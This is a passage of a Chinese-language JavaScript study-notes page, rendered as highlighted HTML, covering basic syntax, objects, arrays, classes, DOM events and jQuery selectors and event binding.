class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>JS</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> input = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;textarea&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> run = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;button&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> output = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;pre&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    run.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> s = input.<span class="property">value</span>;</span><br><span class="line">        output.<span class="property">innerHTML</span> = s;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">    main</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="终端输入输出"><a href="#终端输入输出" class="headerlink" title="终端输入输出"></a>终端输入输出</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> buf = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">process.<span class="property">stdin</span>.<span class="title function_">on</span>(<span class="string">&quot;readable&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> chunk = process.<span class="property">stdin</span>.<span class="title function_">read</span>();</span><br><span class="line">    <span class="keyword">if</span> (chunk) buf += chunk.<span class="title function_">toString</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">process.<span class="property">stdin</span>.<span class="title function_">on</span>(<span class="string">&quot;end&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> q = buf.<span class="title function_">split</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(q[<span class="number">0</span>] + q[<span class="number">1</span>]);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> name = <span class="string">&quot;wy&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> age = <span class="number">9</span>;</span><br><span class="line"><span class="keyword">let</span> s = <span class="string">`My name is <span class="subst">$&#123;name&#125;</span>. I&#x27;m <span class="subst">$&#123;age * <span class="number">2</span>&#125;</span> yeas old.`</span>;</span><br></pre></td></tr></table></figure><h2 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">run.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> s = <span class="built_in">parseInt</span>(input.<span class="property">value</span>);</span><br><span class="line">    <span class="keyword">let</span> res;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (s &gt;= <span class="number">90</span>) &#123;</span><br><span class="line">        res = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        res = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s &gt;= <span class="number">70</span>) &#123;</span><br><span class="line">        res = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (s &gt;= <span class="number">60</span>) &#123;</span><br><span class="line">        res = <span class="string">&#x27;D&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        res = <span class="string">&#x27;E&#x27;</span> </span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    output.<span class="property">innerHTML</span> = res;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><h3 id="遍历下标"><a href="#遍历下标" class="headerlink" title="遍历下标"></a>遍历下标</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">in</span> d) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(d[value]);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="遍历键值"><a href="#遍历键值" class="headerlink" title="遍历键值"></a>遍历键值</h3><p><strong>注意</strong>：</p><ul><li>修改键值<strong>本身</strong>不起作用</li><li>如果键值是地址，则可以索引并修改其<strong>内容</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> d = [[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> value <span class="keyword">of</span> d) &#123;</span><br><span class="line">    value[<span class="number">0</span>] = <span class="number">10</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(d);</span><br></pre></td></tr></table></figure><h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><p>键用不用引号包裹都视为字符串</p><p>空对象：<code>let a = null;</code></p><p>没有任何元素的对象：<code>let a = &#123;&#125;;</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;wy&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="attr">money</span>: <span class="number">999</span>,</span><br><span class="line">    <span class="attr">friends</span>: [<span class="string">&#x27;dqy&#x27;</span>, <span class="string">&#x27;ljy&#x27;</span>, <span class="string">&#x27;wz&#x27;</span>],</span><br><span class="line">    <span class="attr">clothes</span>: &#123;</span><br><span class="line">        <span class="attr">color</span>: <span class="string">&#x27;black&#x27;</span>,</span><br><span class="line">        <span class="attr">price</span>: <span class="number">999</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">add_money</span>: <span class="keyword">function</span> (<span class="params">x</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">money</span> += x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`账户余额：<span class="subst">$&#123;person.money&#125;</span>`</span>);</span><br><span class="line">    person.<span class="title function_">add_money</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`账户余额：<span class="subst">$&#123;person.money&#125;</span>`</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> &#123;</span><br><span class="line">    main</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>元素可以是不同类型(包括函数)</p><p>长度：<code>a.length</code></p><p>末尾添加：<code>a.push(5)</code></p><p>末尾删除：<code>a.pop(5)</code></p><p>删除连续元素：<code>a.splice(2, 3) //删除从下标2开始的3个元素</code></p><p>排序：<code>a.sort()</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">a.<span class="title function_">sort</span>(<span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="comment">// 返回值：正-&gt;a在b后面；负-&gt;a在b前面</span></span><br><span class="line">    <span class="keyword">return</span> a - b;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>下标可以不连续</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">1</span>];</span><br><span class="line">a[<span class="number">5</span>] = <span class="number">5</span>;</span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>没有返回值默认返回<code>undefined</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a, b</span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> add = <span class="keyword">function</span>(<span class="params">a, b</span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">add</span> = (<span class="params">a, b</span>) =&gt; &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="title function_">add</span> = a =&gt; &#123;&#125;;</span><br></pre></td></tr></table></figure><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h3 id="定义类"><a href="#定义类" class="headerlink" title="定义类"></a>定义类</h3><p>类中的属性和方法直接赋值，不需要<code>let</code>或<code>function</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">x</span> = x;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">y</span> = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">init</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">sum</span> = <span class="variable language_">this</span>.<span class="property">x</span> + <span class="variable language_">this</span>.<span class="property">y</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`(<span class="subst">$&#123;<span class="variable language_">this</span>.x&#125;</span>, <span class="subst">$&#123;<span class="variable language_">this</span>.y&#125;</span>)`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>静态属性和方法与类绑定，用类名访问</p><p>静态成员可以被继承</p><p>静态成员相当于全局变量或函数，一处修改全局改变</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        ++<span class="title class_">Test</span>.<span class="property">cnt</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">print</span>(<span class="params">str</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Test</span>.<span class="title function_">print</span>(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Test</span>.<span class="property">cnt</span> = <span class="number">0</span>; <span class="comment">// 定义静态变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test1</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Test</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Test1</span>.<span class="title function_">print</span>(<span class="string">&quot;Hello World!&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="生成实例"><a href="#生成实例" class="headerlink" title="生成实例"></a>生成实例</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Point</span>(<span class="number">3</span>, <span class="number">4</span>);</span><br></pre></td></tr></table></figure><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">x, y</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">x</span> = x;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">y</span> = y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`(<span class="subst">$&#123;<span class="variable language_">this</span>.x&#125;</span>, <span class="subst">$&#123;<span class="variable language_">this</span>.y&#125;</span>)`</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ColorPoint</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Point</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">x, y, color</span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>(x, y);    <span class="comment">// 首先初始化父类</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">color</span> = color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">toString</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.color&#125;</span> <span class="subst">$&#123;<span class="variable language_">super</span>.toString()&#125;</span>`</span>; <span class="comment">// super代表当前父类的实例</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p><a href="https://www.acwing.com/blog/content/18189/">常见的触发函数</a></p><h3 id="鼠标"><a href="#鼠标" class="headerlink" title="鼠标"></a>鼠标</h3><p><code>addEventListener</code>函数为元素绑定事件的触发函数</p><p><code>event</code>：默认参数，可以任意命名</p><ul><li><code>event.type</code>: 事件类型(点击、滚动)</li><li><code>event.button</code>: 0左键; 1滚轮; 2右键</li><li><code>event.clientX</code>: 触发位置的横坐标</li><li><code>event.clientY</code>: 触发位置的纵坐标</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> div = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mouseup&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">type</span>, event.<span class="property">button</span>);  </span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    div.<span class="title function_">addEventListener</span>(<span class="string">&#x27;mousedown&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">type</span>, event.<span class="property">button</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="键盘"><a href="#键盘" class="headerlink" title="键盘"></a>键盘</h3><p><code>event</code>:</p><ul><li><code>event.code</code>: 按下的键</li><li><code>event.shiftKey</code>: 是否按下shift</li><li><code>event.ctrlKey</code>: 是否按下ctrl</li><li><code>event.altKey</code>: 是否按下alt</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> input = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input&#x27;</span>);</span><br><span class="line"></span><br><span class="line">input.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keydown&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">type</span>, event.<span class="property">code</span>, event.<span class="property">shiftKry</span>, event.<span class="property">ctrlKey</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ketpress只识别能显示出来的字符按键</span></span><br><span class="line">input.<span class="title function_">addEventListener</span>(<span class="string">&#x27;keypress&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">type</span>, event.<span class="property">code</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="表单"><a href="#表单" class="headerlink" title="表单"></a>表单</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 聚焦</span></span><br><span class="line">input.<span class="title function_">addEventListener</span>(<span class="string">&#x27;focus&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">type</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取消聚焦</span></span><br><span class="line">input.<span class="title function_">addEventListener</span>(<span class="string">&#x27;blur&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">type</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内容修改，取消聚焦时才会检查内容是否改变</span></span><br><span class="line">input.<span class="title function_">addEventListener</span>(<span class="string">&#x27;change&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">type</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 窗口大小改变</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;resize&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">type</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 窗口滚动，不是鼠标滚轮</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;scroll&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">type</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 页面加载完毕</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">type</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="常用库"><a href="#常用库" class="headerlink" title="常用库"></a><a href="https://www.acwing.com/blog/content/18190/">常用库</a></h2><h3 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h3><h4 id="引入jQ"><a href="#引入jQ" class="headerlink" title="引入jQ"></a>引入jQ</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.acwing.com/static/jquery/js/jquery-3.3.1.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="jQuary选择器"><a href="#jQuary选择器" class="headerlink" title="jQuary选择器"></a>jQuary选择器</h4><ul><li>选出<strong>所有</strong>符合条件的标签</li><li>和CSS选择器完全一样</li></ul><p>标签</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> div = $(<span class="string">&#x27;div&#x27;</span>);</span><br></pre></td></tr></table></figure><p>类</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> mydiv = $(<span class="string">&#x27;.mydiv&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> mydiv = $(<span class="string">&#x27;.mydiv &gt; p&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ID</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> idiv = $(<span class="string">&#x27;#idiv&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="事件绑定与解绑"><a href="#事件绑定与解绑" class="headerlink" title="事件绑定与解绑"></a>事件绑定与解绑</h4><p><code>绑定</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> div = $(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">div.<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;click div&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> div = $(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">div.<span class="title function_">click</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;click div&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>触发函数命名</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> div = $(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">div.<span class="title function_">on</span>(<span class="string">&#x27;click.name1&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;click1&#x27;</span>);</span><br><span class="line">    div.<span class="title function_">off</span>(<span class="string">&#x27;click.name2&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">div.<span class="title function_">on</span>(<span class="string">&#x27;click.name2&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;click2&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>解绑</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">div.<span class="title function_">off</span>(<span class="string">&#x27;click&#x27;</span>);</span><br></pre></td></tr></table></figure><h4 id="事件传递机制"><a href="#事件传递机制" class="headerlink" title="事件传递机制"></a>事件传递机制</h4><p>向上传递</p><p><code>a</code>在<code>div</code>内部，点击<code>a</code>同时触发<code>a</code>和<code>div</code>的<strong>click</strong>函数</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>关闭向上传递：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 